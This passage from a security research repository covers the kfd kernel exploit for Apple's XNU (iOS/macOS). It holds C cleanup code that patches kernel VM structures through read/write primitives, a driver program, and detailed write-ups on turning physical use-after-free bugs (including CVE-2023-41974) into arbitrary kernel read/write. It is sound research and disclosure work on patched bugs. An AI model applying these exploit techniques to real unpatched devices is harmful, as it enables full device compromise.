        }

        /*
         * Patch the doubly-linked list.
         *
         * We leak "vme2b" from the doubly-linked list, as explained in the write-up.
         */
        static_kset(struct vm_map_entry, links.next, leaked_entry_next, leaked_entry_prev);
        static_kset(struct vm_map_entry, links.prev, leaked_entry_prev, leaked_entry_next);

        /*
         * Patch "vme2->vme_end".
         *
         * The kwrite() call is just a workaround if the kwrite primitive cannot
         * overwrite 0. Otherwise, the first 4 lines can be omitted.
         */
        u64 vme_end0_start_and_next[2] = { vme_end0_start, (-1) };
        u64 unaligned_kaddr = vme_end0_kaddr + offsetof(struct vm_map_entry, links.start) + 1;
        u64 unaligned_uaddr = (u64)(&vme_end0_start_and_next) + 1;
        kwrite((u64)(kfd), (void*)(unaligned_uaddr), unaligned_kaddr, sizeof(u64));
        static_kset(struct vm_map_entry, links.end, leaked_entry_end, vme_end0_kaddr);

        /*
         * Patch the red-black tree.
         *
         * We leak "vme2b" from the red-black tree, as explained in the write-up.
         */
        static_kset(struct vm_map_entry, store.entry.rbe_parent, leaked_entry_parent_store, vme_for_store(leaked_entry_right_store));
        static_kset(struct vm_map_entry, store.entry.rbe_left, leaked_entry_right_store, vme_for_store(leaked_entry_parent_store));

        /*
         * Patch map->hdr.nentries.
         *
         * I believe this is not strictly necessary to prevent a kernel panic
         * when the process exits, but I like to patch it just in case.
         */
        u64 nentries_buffer = static_kget(struct _vm_map, hdr.nentries, map_kaddr);
        i32 old_nentries = *(i32*)(&nentries_buffer);
        *(i32*)(&nentries_buffer) = (old_nentries - 1);
        static_kset(struct _vm_map, hdr.nentries, nentries_buffer, map_kaddr);

        /*
         * Patch map->hint.
         *
         * We set map->hint to point to vm_map_to_entry(map), which effectively
         * means there is no valid hint.
         */
        static_kset(struct _vm_map, hint, map_entry_kaddr, map_kaddr);
    } while (0);

    do {
        /*
         * Scan hole list: we use the kread primitive to loop through every hole
         * entry in our VM map's hole list, and record the information that we
         * need to patch things up below. Once again, there are some assertions
         * along the way to make sure the state is corrupted as expected.
         */
        u64 hole_count = 0;
        u64 hole_kaddr = static_kget(struct _vm_map, f_s._holes, map_kaddr);
        u64 first_hole_kaddr = hole_kaddr;
        u64 prev_hole_end = 0;
        u64 first_leaked_hole_prev = 0;
        u64 first_leaked_hole_next = 0;
        u64 first_leaked_hole_end = 0;
        u64 second_leaked_hole_prev = 0;
        u64 second_leaked_hole_next = 0;

        while (true) {
            hole_count++;
            u64 hole_next = static_kget(struct vm_map_entry, links.next, hole_kaddr);
            u64 hole_start = static_kget(struct vm_map_entry, links.start, hole_kaddr);
            u64 hole_end = static_kget(struct vm_map_entry, links.end, hole_kaddr);

            if (hole_start == 0) {
                first_leaked_hole_prev = static_kget(struct vm_map_entry, links.prev, hole_kaddr);
                first_leaked_hole_next = hole_next;
                first_leaked_hole_end = hole_end;
                assert(prev_hole_end == smith->vme[1].address);
            } else if (hole_start == smith->vme[1].address) {
                second_leaked_hole_prev = static_kget(struct vm_map_entry, links.prev, hole_kaddr);
                second_leaked_hole_next = hole_next;
                assert(hole_end == smith->vme[2].address);
            }

            hole_kaddr = hole_next;
            prev_hole_end = hole_end;
            if (hole_kaddr == first_hole_kaddr) {
                break;
            }
        }

        /*
         * Patch the hole entries.
         *
         * We patch the end address of the first hole and we leak the two extra
         * holes, as explained in the write-up.
         */
        static_kset(struct vm_map_entry, links.end, first_leaked_hole_end, first_leaked_hole_prev);
        static_kset(struct vm_map_entry, links.next, first_leaked_hole_next, first_leaked_hole_prev);
        static_kset(struct vm_map_entry, links.prev, first_leaked_hole_prev, first_leaked_hole_next);
        static_kset(struct vm_map_entry, links.next, second_leaked_hole_next, second_leaked_hole_prev);
        static_kset(struct vm_map_entry, links.prev, second_leaked_hole_prev, second_leaked_hole_next);

        /*
         * Patch map->hole_hint.
         *
         * We set map->hole_hint to point to the first hole, which is guaranteed
         * to not be one of the two holes that we just leaked.
         */
        static_kset(struct _vm_map, vmmap_u_1.vmmap_hole_hint, first_hole_kaddr, map_kaddr);
    } while (0);

    if (take_vm_map_lock) {
        /*
         * Restore the entry to have its right child point to its original value.
         */
        u64 entry_kaddr = atomic_load(&smith->cleanup_vme.kaddr);
        u64 entry_right = atomic_load(&smith->cleanup_vme.right);
        static_kset(struct vm_map_entry, store.entry.rbe_right, entry_right, entry_kaddr);
        assert_bsd(pthread_join(smith->cleanup_vme.pthread, NULL));
    }
}

#endif /* smith_h */

```

`macos_kfd.c`:

```c
/*
 * Copyright (c) 2023 FÃ©lix Poulin-BÃ©langer. All rights reserved.
 */

#define TARGET_MACOS 1
#include "kfd/libkfd.h"

int main(void)
{
    u64 kfd = kopen(2048, puaf_landa, kread_sem_open, kwrite_sem_open);
    // At this point, kfd can be used with kread() and kwrite().
    kclose(kfd);
}

```

`writeups/exploiting-puafs.md`:

```md
# Exploiting PUAFs

---

## Table of Contents

- [What is a PUAF primitive?](#what-is-a-puaf-primitive)
- [What to do before a PUAF exploit?](#what-to-do-before-a-puaf-exploit)
- [What to do after a PUAF exploit?](#what-to-do-after-a-puaf-exploit)
- [Impact of XNU mitigations on PUAF exploits](#impact-of-xnu-mitigations-on-puaf-exploits)
- [Appendix: Discovery of the PUAF primitive](#appendix-discovery-of-the-puaf-primitive)

---

## What is a PUAF primitive?

PUAF is an acronym for "physical use-after-free". As opposed to a normal UAF, which stems from a
dangling pointer to a virtual address (VA), a PUAF originates from a dangling pointer to the
physical address (PA) of a memory region. Although PA pointers could be stored in other kernel data
structures, here it will be assumed that the dangling PA pointer is contained directly in a
leaf-level page table entry (i.e. an L3 PTE in the case of iOS and macOS) from the page table
hierarchy of the exploiting user process. In addition, in order to qualify as a PUAF primitive, it
will also be assumed that the corresponding physical page has been put back on the free list. In
XNU, every physical page of memory is represented by a `vm_page` structure, whose `vmp_q_state`
field determines which queue the page is on, and whose `vmp_pageq` field contains 32-bit packed
pointers to the next and previous pages in that queue. Note that the main "free list" in XNU is
represented by `vm_page_queue_free`, which is an array of `MAX_COLORS` (128) queues (although the
actual number of free queues used depends on the device configuration). Finally, although a dangling
PTE with read-only access in the AP bits (e.g. [P0 issue 2337][1]) would still be considered an
important security vulnerability, it would not be directly exploitable. Therefore, in this write-up,
a PUAF primitive entails that the dangling PTE gives read/write access to user space in the AP bits.
To summarize, in order to obtain a PUAF primitive, we must achieve a dangling L3 PTE with read/write
access on a physical page which has been put back on the free list, such that the kernel can grab it
and reuse it for absolutely anything!

[1]: https://bugs.chromium.org/p/project-zero/issues/detail?id=2337

---

## What to do before a PUAF exploit?

As mentioned above, once a PUAF primitive has been achieved, the corresponding physical pages could
be reused for anything. However, if the higher-privileged Page Protection Layer (PPL) is running out
of free pages in `pmap_ppl_free_page_list`, the regular kernel might grab pages from its own free
queues and give them to PPL by calling `pmap_mark_page_as_ppl_page_internal()`. That said, this PPL
routine will verify that the given page is indeed not mapped outside of the physical aperture, or
else it  will trigger a "page still has mappings" panic. But since a PUAF primitive requires a
dangling PTE, this check would always fail and cause a kernel panic. Therefore, after obtaining PUAF
pages, we must avoid marking them as PPL-owned. Hence, before starting a PUAF exploit, we should
attempt to fill `pmap_ppl_free_page_list` as much as possible, such that PPL is less likely to run
out of free pages during the critical section of the exploit. Fortunately, we can easily allocate
PPL-owned pages by calling `vm_allocate()` with the flag `VM_FLAGS_FIXED` for all addresses aligned
to the L2 block size inside the allowed VA range of our VM map. If there were previously no mappings
in that L2 block size, then PPL will first need to allocate an L3 translation table to accommodate
the new mapping. Then, we can simply deallocate those mappings and PPL will put the empty L3
translation table pages back in `pmap_ppl_free_page_list`. This is done in the function
`puaf_helper_give_ppl_pages()`, located in [puaf.h](../kfd/libkfd/puaf.h).

On macOS, the maximum VA that is mappable by a user process (i.e. `current_map()->max_offset`) is
quite high, such that we can fill the PPL page free list with an extremely large number of pages.
However, on iOS, the maximum VA is much lower, such that we can only fill it with roughly 200 pages.
Despite that, I almost never run into the "page still has mappings" panic, even when the exploit is
configured to obtain 2048 PUAF pages, which works great for personal research. Please note that a
higher number of PUAF pages makes it easier for the rest of the exploit to achieve a kernel
read/write primitive. That said, for maximum reliability, if the PUAF exploit is repeatable (e.g.
PhysPuppet and Landa), an attacker could instead obtain a PUAF primitive on a smaller number of
pages, then attempt to get the kernel read/write primitive, and repeat the process as needed if the
latter part did not succeed.

---

## What to do after a PUAF exploit?

Let's suppose that we have successfully exploited a vulnerability to obtain a PUAF primitive on an
arbitrary number of physical pages, now what? Note that free pages are added at the tail of the free
queues by the `vm_page_queue_enter()` macro, but there is no way from user space to know exactly
where our PUAF pages are going to be located in those free queues. In order to remedy that, we can
do the following:

1. Run some code that will grab a few pages from the free queues and populate them with unique and
   recognizable content.
2. Scan all the PUAF pages for that recognizable content by reading through the dangling PTEs.
3. If we find the content, then we have reached the PUAF pages in one of the free queues, so we can
   move on to the next stage. Otherwise, we go back to step 1 to grab a few more pages, and we
   repeat this loop until we finally hit the PUAF pages.

This stage of the exploit could probably be optimized tremendously to take into account the fact
that `vm_page_queue_free` is made up of an array of free queues. However, as it stands, the exploit
will simply grab free pages in chunks of 4 by calling `vm_copy()` on a purgeable source region,
until a quarter of the PUAF pages have been successfully grabbed. This is a gross heuristic that
completely wastes 25% of the PUAF pages, but it has worked exceedingly well for me, so I never had
to optimize it further. This is done in the function `krkw_helper_grab_free_pages()`, located in
[krkw.h](../kfd/libkfd/krkw.h), which I might upgrade in the future.

Now that our PUAF pages are likely to be grabbed, we can turn the PUAF primitive into a more
powerful kernel read/write primitive with the following high-level strategy:

1. Spray an "interesting" kernel object, such that it is reallocated in one of the remaining PUAF
   pages.
2. Scan the PUAF pages through the dangling PTEs for a "magic value" to confirm the successful
   reallocation and to identify exactly which PUAF page contains the target kernel object.
3. Overwrite a non-PAC'ed kernel pointer in the target kernel object with a fully controlled value,
   by directly overwriting it through the appropriate dangling PTE. It would also be possible to
   craft a set of fake kernel objects within the PUAF pages if necessary, but none of the methods
   described below require that.
4. Get a kernel read or kernel write primitive through a syscall that makes use of the overwritten
   kernel pointer.

For example, in my original exploit for PhysPuppet, I was inspired by SockPuppet and decided to
target socket-related objects. Thus, the generic steps listed above would map to the specific
actions listed below:

1. Spray `inp_tp` structures with the `socket()` syscall.
2. Scan the PUAF pages for the magic value in the `t_keepintvl` field, which has been set with the
   `setsockopt()` syscall for the `TCP_KEEPINTVL` option.
3. Overwrite the `inp6_outputopts` field, which is a pointer to a `ip6_pktopts` structure.
4. Get a 4-byte kernel read primitive from `inp6_outputopts->ip6po_minmtu` with the `getsockopt()`
   syscall for the `IPV6_USE_MIN_MTU` option, and get a 4-byte kernel write primitive restricted to
   values between -1 and 255 from `inp6_outputopts->ip6po_tclass` with the `setsockopt()` syscall
   using the `IPV6_TCLASS` option.

However, I was not really satisfied with this part of the exploit because the kernel write
primitive was too restricted and the required syscalls (i.e. `socket()` and `[get/set]sockopt()`)
are all denied from the WebContent sandbox. That said, when I found the vulnerability for Smith,
which was exploitable from WebContent unlike PhysPuppet, I decided to look for other interesting
target kernel objects which could be sprayed from the WebContent sandbox, such that the entire
exploit satisfied that constraint. Unlike for the socket method described above, which used the same
target kernel object for both the kernel read and write primitives, I ended up finding distinct
objects for both primitives.

Here is the description of the
[`kread_kqueue_workloop_ctl` method](../kfd/libkfd/krkw/kread/kread_kqueue_workloop_ctl.h):

1. Spray `kqworkloop` structures with the `kqueue_workloop_ctl()` syscall.
2. Scan the PUAF pages for the magic value in the `kqwl_dynamicid` field, which has been set
   directly by `kqueue_workloop_ctl()` above.
3. Overwrite the `kqwl_owner` field, which is a pointer to a `thread` structure.
4. Get an 8-byte kernel read primitive from `kqwl_owner->thread_id` with the `proc_info()` syscall
   for the `PROC_INFO_CALL_PIDDYNKQUEUEINFO` callnum.

And here is the description of the [`kwrite_dup` method](../kfd/libkfd/krkw/kwrite/kwrite_dup.h):

1. Spray `fileproc` structures with the `dup()` syscall (to duplicate any file descriptor).
2. This time, no fields can be set to a truly unique magic value for the `fileproc` structure.
   Therefore, we scan the PUAF pages for the expected bit pattern of the entire structure. Then, we
   use the `fcntl()` syscall with the `F_SETFD` cmd to update the value of the `fp_flags` field to
   confirm the successful reallocation and to identify exactly which file descriptor owns that
   `fileproc` object.
3. Overwrite the `fp_guard` field, which is a pointer to a `fileproc_guard` structure.
4. Get an 8-byte kernel write primitive from `fp_guard->fpg_guard` with the `change_fdguard_np()`
   syscall. However, that method cannot overwrite a value of 0, nor overwrite any value to 0.

This worked well enough, and at the time of writing, all the syscalls used by those methods are part
of the WebContent sandbox. However, although the `proc_info()` syscall is allowed, the
`PROC_INFO_CALL_PIDDYNKQUEUEINFO` callnum is denied. Therefore, I had to find another kernel read
primitive. Fortunately, it was pretty easy to find one by looking at the other callnums of
`proc_info()` which are allowed by the WebContent sandbox.

Here is the description of the [`kread_sem_open` method](../kfd/libkfd/krkw/kread/kread_sem_open.h):

1. Spray `psemnode` structures with the `sem_open()` syscall.
2. Once again, no fields can be set to a truly unique magic value for the `psemnode` structures.
   Therefore, we scan the PUAF pages for four consecutive structures, which should contain the same
   `pinfo` pointer in the first 8 bytes and zero padding in the second 8 bytes. Then, we increment
   the `pinfo` pointer by 4 through the dangling PTE and we use the `proc_info()` syscall to
   retrieve the name of the posix semaphore, which should now be shifted by 4 characters when we hit
   the right file descriptor.
3. Overwrite the `pinfo` field, which is a pointer to a `pseminfo` structure.
4. Get an 8-byte kernel read primitive from `pinfo->psem_uid` and `pinfo->psem_gid` with the
   `proc_info()` syscall for the `PROC_INFO_CALL_PIDFDINFO` callnum, which is not denied by the
   WebContent sandbox.

Please note that `shm_open()`, which is also part of the WebContent sandbox, could also be used to
achieve a kernel read primitive, in much the same way as `sem_open()`. However, `sem_open()` makes
it easier to determine the address of `current_proc()` through the semaphore's `owner` field.
Lastly, the [`kwrite_sem_open` method](../kfd/libkfd/krkw/kwrite/kwrite_sem_open.h) works just like
the `kwrite_dup` method, but the `fileproc` structures are sprayed with the `sem_open()` syscall
instead of the `dup()` syscall.

At this point, we have a decent kernel read/write primitive, but there are some minor encumbrances:

- The kernel read primitive successfully reads 8 bytes from `pinfo->psem_uid` and `pinfo->psem_gid`,
  but it also reads other fields of the `pseminfo` structure located before and after those two.
  This can cause problems if the address we want to read is located at the very beginning of a page.
  In that case, the fields before `psem_uid` and `psem_gid` would end up in the previous virtual
  page, which might be unmapped and therefore cause a "Kernel data abort" panic. Of course, in such
  a case, we could use a variant that is guaranteed to not underflow a page by using the first bytes
  read from the modified kernel pointer. This is done in the function `kread_sem_open_kread_u32()`.
- The kernel write primitive cannot overwrite a value of 0, nor overwrite any value to 0. There are
  simple workarounds for both scenarios. For example, the function `smith_helper_cleanup()` uses
  such a workaround to overwrite a value of 0. The workaround to overwrite a value to 0 is left as
  an exercise for the reader.

Although we can overcome these impediments easily, it would be nice to bootstrap a better kernel
read/write from those initial primitives. This is achieved in [perf.h](../kfd/libkfd/perf.h),
but libkfd only supports this part of the exploit on the iPhone 14 Pro Max for certain versions
of iOS (see the supported versions in the function `perf_init()`). Currently, I am using some static
addresses from those kernelcaches to locate certain global kernel objects (e.g. `perfmon_devices`),
which cannot be found easily by chasing data pointers. It would probably be possible to achieve the
same outcome dynamically by chasing offsets in code, but this is left as an exercise for the reader
for now. As it stands, here is how the setup for the better kernel read/write is achieved:

1. We call `vm_allocate()` to allocate a single page, which will be used as a shared buffer between
   user space and kernel space later on. Note that we also call `memset()` to fault in that virtual
   page, which will grab a physical page and populate the corresponding PTE.
2. We call `open("/dev/aes_0", O_RDWR)` to open a file descriptor. Please note that we could open
   any character device which is accessible from the target sandbox, because we will corrupt it
   later on to redirect it to `"/dev/perfmon_core"` instead.
3. We use the kernel read primitive to obtain the slid address of the function `vn_kqfilter()` by
   chasing the pointers `current_proc()->p_fd.fd_ofiles[fd]->fp_glob->fg_ops->fo_kqfilter`, where
   "fd" is the opaque file descriptor returned by the `open()` syscall in the previous step.
4. We calculate the kernel slide by substracting the slid address of the function `vn_kqfilter()`
   with the static address of that function in the kernelcache. We then make sure that the base of
   the kernelcache contains the expected Mach-O header.
5. We use the kernel read primitive to scan the `cdevsw` array until we find the major index for
   `perfmon_cdevsw`, which seems to always be 0x11.
6. From the `fileglob` structure we found earlier, we use the kernel read primitive to retrieve the
   original `dev_t` from `fg->fg_data->v_specinfo->si_rdev` and we use the kernel write primitive to
   overwrite it such that it indexes into `perfmon_cdevsw` instead. In addition, the `si_opencount`
   field is incremented by one to prevent `perfmon_dev_close()` from being called if the process
   exits before calling `kclose()`, which would trigger a "perfmon: unpaired release" panic.
7. We use the kernel read primitive to retrieve a bunch of useful globals (`vm_pages`,
   `vm_page_array_beginning_addr`, `vm_page_array_ending_addr`, `vm_first_phys_ppnum`, `ptov_table`,
   `gVirtBase`, `gPhysBase` and `gPhysSize`) as well as TTBR0  from `current_pmap()->ttep` and TTBR1
   from `kernel_pmap->ttep`.
8. We can then manually walk our page tables starting from TTBR0 to find the physical address of the
   shared page allocated in step 1. And since we retrieved the `ptov_table` in the previous step, we
   can then use `phystokv()` to find the kernel VA for that physical page inside the physmap.
9. Finally, we use the kernel write primitive to corrupt the `pmdv_config` field of the first
   perfmon device to point to the shared page (i.e. with the kernel VA retrieved in the previous
   step), and to set the `pmdv_allocated` boolean field to `true`.

At this point, the setup is complete. To read kernel memory, we can now craft a `perfmon_config`
structure in the shared page, as shown in the image below, then use the `PERFMON_CTL_SPECIFY` ioctl
to read between 1 and 65535 bytes from an arbitrary kernel address. In addition, note that the
region being read must satisfy the `zone_element_bounds_check()` in `copy_validate()`, because this
technique uses `copyout()` under the hood.

![exploiting-puafs-figure1.png](figures/exploiting-puafs-figure1.png)

To write kernel memory, we can now craft a `perfmon_config`, `perfmon_source` and  `perfmon_event`
structure in the shared page, as shown in the image below, then use the `PERFMON_CTL_ADD_EVENT`
ioctl to write 8 bytes to an arbitrary kernel address. That said, at that point, `kwrite()` can
accept any size that is a multiple of 8 because it will perform this technique in a loop.

![exploiting-puafs-figure2.png](figures/exploiting-puafs-figure2.png)

Finally, on `kclose()`, the function `perf_free()` will restore the `si_rdev` and `si_opencount`
fields to their original values, such that all relevant kernel objects are cleaned up properly when
the file descriptor is closed. However, if the process exits before calling `kclose()`, this cleanup
will be incomplete and the next attempt to `open("/dev/aes_0", O_RDWR)` will fail with `EMFILE`.
Therefore, it would be cleaner to use the kernel write primitive to "manually" close the
device-specific kernel objects of that file descriptor, such that the process could exit at any
moment and still leave the kernel in a clean state. For now, this is left as an exercise for the
reader.

---

## Impact of XNU mitigations on PUAF exploits

So, how effective were the various iOS kernel exploit mitigations at blocking the PUAF technique?
The mitigations I condisered were KASLR, PAN, PAC, PPL, `zone_require()`, and `kalloc_type()`:

- KASLR does not really impact this technique since we do not need to leak a kernel address in order
  to obtain the PUAF primitive in the first place. Of course, we eventually want to obtain the
  addresses of the kernel objects that we want to read or write, but at that point, we have endless
  possibilities of objects to spray inside the PUAF pages in order to gather that information.
- PAN also does not really have an impact on this technique. Although none of the kread and kwrite
  methods I described above required us to craft a set of fake kernel objects, other methods could.
  In that case, the absence of PAN would be useful. However, in practice, there are plenty of
  objects that could leak the address of the PUAF pages in kernel space, such that we could craft
  those fake objects directly in those PUAF pages.
- PAC as a form of control flow integrity is completely irrelevant for this technique as it is a
  form of data-only attack. That said, in my opinion, PAC for data pointers is the mitigation that
  currently has the biggest impact on this technique, because there are a lot more kernel objects
  that we could target in order to obtain a kernel read/write primitive if certain members of those
  structures had not been signed.
- PPL surprisingly does very little to prevent this technique. Of course, it prevents the PUAF pages
  from being reused as page tables and other PPL-protected structures. But in practice, it is very
  easy to dodge the "page still has mappings" panic and to reuse the PUAF pages for other
  interesting kernel objects. I expect this to change!
- `zone_require()` has a similar impact as data-PAC for this technique, by preventing us from
  forging kernel pointers inside the PUAF pages if they are verified with this function.
- `kalloc_type()` is completely irrelevant for this technique as it only provides protection against
  virtual address reuse, as opposed to physical address reuse.

---

## Appendix: Discovery of the PUAF primitive

First of all, I want to be clear that I do not claim to be the first researcher to discover this
primitive. As far as I know, Jann Horn of Google Project Zero was the first researcher to publicly
report and disclose dangling PTE vulnerabilities:

- [P0 issue 2325][2], reported on June 29, 2022 and disclosed on August 24, 2022.
- [P0 issue 2327][3], reported on June 30, 2022 and disclosed on September 19, 2022.

In addition, TLB flushing bugs could be considered a variant of the PUAF primitive, which Jann Horn
found even earlier:

- [P0 issue 1633][4], reported on August 15, 2018 and disclosed on September 10, 2018.
- [P0 issue 1695][5], reported on October 12, 2018 and disclosed on October 29, 2018.

For iOS, I believe Ian Beer was the first researcher to publicly disclose a dangling PTE
vulnerability, although with read-only access:

- [P0 issue 2337][6], reported on July 29, 2022 and disclosed on November 25, 2022.

Please note that other researchers might have found similar vulnerabilities earlier, but these are
the earliest ones I could find. I reported PhysPuppet to Apple a bit before Ian Beer's issue was
disclosed to the public and, at that time, I was not aware of Jann Horn's research. Therefore, in
case it is of interest to other researchers, I will share how I stumbled upon this powerful
primitive. When I got started doing vulnerability research, during the first half of 2022, I found
multiple buffer overflows in the SMBClient kernel extension and a UAF in the in-kernel NFS client
(i.e. a normal UAF that reuses a VA and not a PA). However, given that I was pretty unexperienced
with exploitation back then and that Apple had already delivered a lot of mitigations for classical
memory corruption vulnerabilities, I had no idea how to exploit them. My proofs-of-concept would
only trigger "one-click" remote kernel panics, but that quickly became unsatisfying. Therefore,
during the second half of 2022, I decided to look for better logic bugs in the XNU kernel. In
particular, I was inspired to attack physical memory by Brandon Azad's blog post
[One Byte to rule them all][7]. That said, his technique required a one-byte linear heap overflow
primitive (amongst other things) to gain the arbitrary physical mapping primitive. But I was
determined to avoid memory corruption, so I decided to look for other logic bugs that could allow a
user process to control the physical address entered in one of its own PTEs. After spending a lot of
time reading and re-reading the VM map and pmap code, I eventually came to the conclusion that
obtaining an arbitrary physical mapping primitive as an initial primitive would be unrealistic.
Fortunately, I got incredibly lucky right after that!

As I was perusing the code in `vm_map.c` for the thousandth time, I was struck by just how many
functions would assert that the start and end addresses of a `vm_map_entry` structure are
page-aligned (e.g. in `vm_map_enter()`, `vm_map_entry_insert()`, `vm_map_entry_zap()`, and many
other functions). Given that those assertions are not enabled in release builds, I was curious to
know what would happen if we could magically create an "unaligned entry" in our VM map? For example,
if the `vme_start` field was equal to a page-aligned address A but the `vme_end` field was equal to
A + PAGE_SIZE + 1, how would the functions `vm_fault()` and `vm_map_delete()` behave? To my
astonishment, I realized that this condition would trivially lead to a dangling PTE. That said, at
that point in time, this was just an idea, albeit a very promising one! Therefore, I went on to look
for logic bugs that could allow an attacker to create such an unaligned entry. First, I investigated
all the attack surface that was reachable from the WebContent sandbox but I was not able to find one.
However, after giving up on a vulnerability reachable from WebContent, I quickly came across the MIG
routine `mach_memory_object_memory_entry_64()` and found the vulnerability for PhysPuppet, which is
covered in detail in a separate [write-up](physpuppet.md).

After that, I checked online for existing exploits that achieved a PUAF primitive. At that time, I
could not find any for iOS but that is when I stumbled upon Jann Horn's Mali issues. As a quick
aside, I also skimmed his blog post about [exploiting a simple Linux memory corruption bug][8],
which I mistakenly thought was a variant of the PUAF primitive with a dangling PTE in kernel space
rather than user space. I later realized that this was just a normal UAF, but I got confused because
he exploited it through the page allocator by reallocating the victim page as a page table. That
said, I knew this would not be possible on iOS because of the formidable PPL. However, as I was
already familiar with Ned Williamson's [SockPuppet exploit][9], I had a pretty solid hunch that I
could exploit the dangling PTEs by reallocating socket-related objects inside the PUAF pages, then
by using the `getsockopt()`/`setsockopt()` syscalls in order to obtain the kernel read/write
primitives, respectively.

[2]: https://bugs.chromium.org/p/project-zero/issues/detail?id=2325
[3]: https://bugs.chromium.org/p/project-zero/issues/detail?id=2327
[4]: https://bugs.chromium.org/p/project-zero/issues/detail?id=1633
[5]: https://bugs.chromium.org/p/project-zero/issues/detail?id=1695
[6]: https://bugs.chromium.org/p/project-zero/issues/detail?id=2337
[7]: https://googleprojectzero.blogspot.com/2020/07/one-byte-to-rule-them-all.html
[8]: https://googleprojectzero.blogspot.com/2021/10/how-simple-linux-kernel-memory.html
[9]: https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html

```

`writeups/landa.md`:

```md
# Landa

In the original French:

> Il y avait une autre chose que je voulais vous demander.                                         \
> Mais maintenant, sur ma vie, impossible de m'en souvenir.                                        \
> Enfin, bon, Ã§a ne devait pas Ãªtre important.

Translated in English:

> I did have something else I wanted to ask you.                                                   \
> But right now, for the life of me, I can't remember what it is.                                  \
> Oh well, must not have been important.

Hans Landa - Inglourious Basterds

---

## Abbreviations

- KRKW: kernel read/write
- PUAF: physical use-after-free
- VMC: `vm_map_copy` structure
- VME: `vm_map_entry` structure
- VMO: `vm_object` structure

---

## Table of Contents

- [Introduction](#introduction)
- [Part A: From Vulnerability to PUAF](#part-a-from-vulnerability-to-puaf)
- [Part B: From PUAF to KRKW](#part-b-from-puaf-to-krkw)
- [Part C: From KRKW to Cleanup](#part-c-from-krkw-to-cleanup)

---

## Introduction

This write-up presents an exploit for a vulnerability in the XNU kernel:

- Assigned [CVE-2023-41974][1].
- Fixed in iOS 17.0 and macOS 14.0.
- Reachable from the App Sandbox but not the WebContent sandbox.
- Note that Landa is very similar to [P0 issue 2361][2], which was a race condition that allowed
  writing to read-only mappings. Specifically, `vm_map_copy_overwrite_nested()` would check that the
  VMEs in the destination range are overwriteable, but `vm_map_copy_overwrite_unaligned()` could
  drop the map lock and it would not perform the same check after taking it back. Landa works the
  same way, but for VMEs that are "in transition" instead.

The exploit has been successfully tested on:

- iOS 16.5 and 16.5.1 (iPhone 14 Pro Max)
- macOS 13.4 and 13.4.1 (MacBook Air M2 2022)

All code snippets shown below are from [xnu-8796.101.5][3].

[1]: https://support.apple.com/en-us/HT213938
[2]: https://bugs.chromium.org/p/project-zero/issues/detail?id=2361
[3]: https://github.com/apple-oss-distributions/xnu/tree/xnu-8796.101.5

---

## Part A: From Vulnerability to PUAF

This part of the exploit is made up of 3 steps, which are labeled in the function `landa_run()`,
located in [landa.h](../kfd/libkfd/puaf/landa.h). Each step will be described in detail below, with
figures illustrating the relevant kernel state at certain points in the exploit. Note that the green
boxes represent VMEs, the yellow boxes represent VMOs, the purple boxes represent VMCs, and the red
text highlights the difference compared to the previous figure. Also, please note that X denotes the
desired number of PUAF pages and P denotes the page size (i.e. 16384 bytes). Lastly, before reading
the description of each step, please check the corresponding code in the function `landa_run()`, as
it won't be repeated here.

#### STEP 1:

This step is responsible for the setup, such that we can trivially win the race condition in step 2.
In substep 1A, we `vm_allocate()` a memory region of (X+2) pages at a random address A, which will
be used as the source range of the copy in step 2. Then, we split that memory region into three
distinct VMEs, described in the list below in ascending address order:

- `src_vme_1` has a size of 1 page and owns the only reference to `src_vmo_1`.
- `src_vme_2` has a size of 1 page and owns the only reference to `src_vmo_2`.
- `src_vme_3` has a size of X pages and owns the only reference to `src_vmo_3`.

Note that all source VMEs are initialized with a purgeable object, which has a `copy_strategy` of
`MEMORY_OBJECT_COPY_NONE`, by using the flag `VM_FLAGS_PURGABLE`. In addition, the entire source
range is faulted in with `memset()`. Here is an illustration of the relevant kernel state after
substep 1A:

![landa-figure1.png](figures/landa-figure1.png)

In substep 1B, we `vm_allocate()` a memory region of (X+3) pages at a random address B, which will
be used as the destination range of the copy in step 2, except for the last page. Then, we split
that memory region into four distinct VMEs, described in the list below in ascending address order:

- `dst_vme_1` has a size of 1 page and owns the only reference to `dst_vmo_1`. Also,
  `dst_vme_1->user_wired_count` is set to `MAX_WIRE_COUNT` with a simple `mlock()` for-loop.
- `dst_vme_2` has a size of 1 page and owns the only reference to `dst_vmo_2`. Also,
  `dst_vme_2->is_shared` is set to `TRUE` by remapping it on itself with `vm_remap()` and
  `dst_vme_2->user_wired_count` is set to 1 with a single call to `mlock()`.

A single VME is originally allocated in the last (X+1) pages, but it is then clipped into two VMEs
by marking the last page as read-only with `vm_protect()`:

- `dst_vme_3` has a size of X pages and owns one of two references on `dst_vmo_3`.
- `dst_vme_4` has a size of 1 page and owns the other reference on `dst_vmo_3`. Also,
  `dst_vme_4->protection` is set to `VM_PROT_READ` by `vm_protect()`.

Once again, note that all destination VMEs are initialized with a purgeable object, which has a
`copy_strategy` of `MEMORY_OBJECT_COPY_NONE`, by using the flag `VM_FLAGS_PURGABLE`. In addition,
the entire destination range, which excludes the read-only page of `dst_vme_4`, is faulted in with
`memset()`. Here is an illustration of the relevant kernel state after substep 1B:

![landa-figure2.png](figures/landa-figure2.png)

#### STEP 2:

Before triggering the race condition in earnest, we first spawn another thread to run the function
`landa_helper_spinner_pthread()`, which will attempt to wire (X+2) pages starting at address B (i.e.
`dst_vme_1` to `dst_vme_3`) in a busy-loop. However, `dst_vme_1->user_wired_count` is already set to
`MAX_WIRE_COUNT`, so `mlock()` does basically nothing and just returns `ENOMEM`. Next, from the main
thread, we call `vm_copy()` to copy (X+2) pages from address A to address B, which will exploit the
race condition.

In substep 2A, we consider the `vm_map_copyin()` part of `vm_copy()`. Since the source range is
entirely made up of purgeable memory, no copy-on-write optimization is applied. Instead, three new
VMOs, `copy_vmo_1` to `copy_vmo_3`, are allocated to hold the (X+2) copied pages from the three
source VMOs, `src_vmo_1` to `src_vmo_3`, respectively. This happens over three distinct calls to
`vm_object_copy_strategically()` from `vm_map_copyin_internal()`. Finally, when `vm_map_copyin()`
returns, the output VMC contains three temporary VMEs, `copy_vme_1` to `copy_vme_3`, each of which
respectively owns the only reference to `copy_vmo_1` to `copy_vmo_3` at that point in time. Here is
an illustration of the relevant kernel state after substep 2A:

![landa-figure3.png](figures/landa-figure3.png)

In substep 2B, we consider the `vm_map_copy_overwrite()` part of `vm_copy()`, up to the point where
`mlock()` is no longer stuck on `ENOMEM` in the spinner thread. First, the copy is completely
